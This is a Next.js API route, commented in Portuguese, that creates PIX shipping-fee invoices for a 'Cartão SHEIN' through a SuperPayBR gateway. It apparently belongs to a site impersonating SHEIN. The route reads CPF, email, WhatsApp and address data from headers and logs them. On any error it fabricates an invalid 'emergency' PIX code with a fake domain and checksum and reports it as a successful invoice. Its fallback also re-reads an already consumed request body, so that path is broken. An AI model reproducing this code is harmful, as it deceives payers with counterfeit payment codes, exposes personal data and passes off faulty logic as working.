import { type NextRequest, NextResponse } from "next/server"

export async function POST(request: NextRequest) {
  try {
    console.log("🔄 Criando fatura SuperPayBR...")

    const { amount, shipping, method } = await request.json()

    // Obter dados do usuário dos headers
    const cpfData = JSON.parse(request.headers.get("x-cpf-data") || "{}")
    const userEmail = request.headers.get("x-user-email") || ""
    const userWhatsApp = request.headers.get("x-user-whatsapp") || ""
    const deliveryAddress = JSON.parse(request.headers.get("x-delivery-address") || "{}")

    console.log("📋 Dados recebidos:", {
      amount,
      shipping,
      method,
      customer: cpfData.nome,
      email: userEmail,
    })

    // Autenticar com SuperPayBR
    const authResponse = await fetch(`${request.nextUrl.origin}/api/superpaybr/auth`)
    const authResult = await authResponse.json()

    if (!authResult.success) {
      throw new Error("Falha na autenticação SuperPayBR")
    }

    const accessToken = authResult.data.access_token

    // Gerar external_id único
    const externalId = `SHEIN_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`

    // Criar fatura SuperPayBR
    const invoiceData = {
      external_id: externalId,
      amount: Math.round(amount * 100), // Converter para centavos
      description: `Frete ${method} - Cartão SHEIN`,
      customer: {
        name: cpfData.nome || "Cliente",
        email: userEmail || "cliente@exemplo.com",
        phone: userWhatsApp || "11999999999",
        document: cpfData.cpf || "",
      },
      webhook_url: `${request.nextUrl.origin}/api/superpaybr/webhook`,
      expires_at: new Date(Date.now() + 2 * 60 * 60 * 1000).toISOString(), // 2 horas
    }

    console.log("📤 Enviando dados para SuperPayBR:", invoiceData)

    const createResponse = await fetch("https://api.superpaybr.com/invoices", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        Authorization: `Bearer ${accessToken}`,
      },
      body: JSON.stringify(invoiceData),
    })

    if (!createResponse.ok) {
      const errorData = await createResponse.text()
      console.log("❌ Erro da API SuperPayBR:", errorData)
      throw new Error(`SuperPayBR API error: ${createResponse.status}`)
    }

    const invoiceResult = await createResponse.json()

    console.log("📥 Resposta da SuperPayBR:", invoiceResult)

    // Processar resposta e garantir QR Code
    const processedInvoice = {
      id: invoiceResult.id || externalId,
      invoice_id: invoiceResult.invoice_id || invoiceResult.id,
      external_id: externalId,
      pix: {
        payload: invoiceResult.pix?.payload || invoiceResult.pix_code || "",
        image: invoiceResult.pix?.image || "",
        qr_code:
          invoiceResult.pix?.qr_code ||
          (invoiceResult.pix?.payload
            ? `https://quickchart.io/qr?text=${encodeURIComponent(invoiceResult.pix.payload)}&size=200`
            : "/placeholder.svg?height=200&width=200"),
      },
      status: {
        code: invoiceResult.status?.code || 1,
        title: invoiceResult.status?.title || "Aguardando Pagamento",
        text: invoiceResult.status?.text || "pending",
      },
      valores: {
        bruto: Math.round(amount * 100),
        liquido: Math.round(amount * 100),
      },
      vencimento: {
        dia: new Date(Date.now() + 2 * 60 * 60 * 1000).toISOString().split("T")[0],
      },
      type: "real",
    }

    console.log("✅ Fatura SuperPayBR processada:", processedInvoice.external_id)

    return NextResponse.json({
      success: true,
      data: processedInvoice,
    })
  } catch (error) {
    console.log("❌ Erro ao criar fatura SuperPayBR:", error)

    // Retornar fatura de emergência
    const { amount } = await request.json()
    const externalId = `SHEIN_EMG_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`
    const emergencyPix = `00020101021226580014br.gov.bcb.pix2536emergency.superpaybr.com/qr/v2/${externalId}520400005303986540${amount.toFixed(2)}5802BR5909SHEIN5011SAO PAULO62070503***6304EMRG`

    const emergencyInvoice = {
      id: externalId,
      invoice_id: externalId,
      external_id: externalId,
      pix: {
        payload: emergencyPix,
        image: "/placeholder.svg?height=250&width=250",
        qr_code: `https://quickchart.io/qr?text=${encodeURIComponent(emergencyPix)}&size=200`,
      },
      status: {
        code: 1,
        title: "Aguardando Pagamento",
        text: "pending",
      },
      valores: {
        bruto: Math.round(amount * 100),
        liquido: Math.round(amount * 100),
      },
      vencimento: {
        dia: new Date(Date.now() + 24 * 60 * 60 * 1000).toISOString().split("T")[0],
      },
      type: "emergency",
    }

    return NextResponse.json({
      success: true,
      data: emergencyInvoice,
      fallback: true,
    })
  }
}
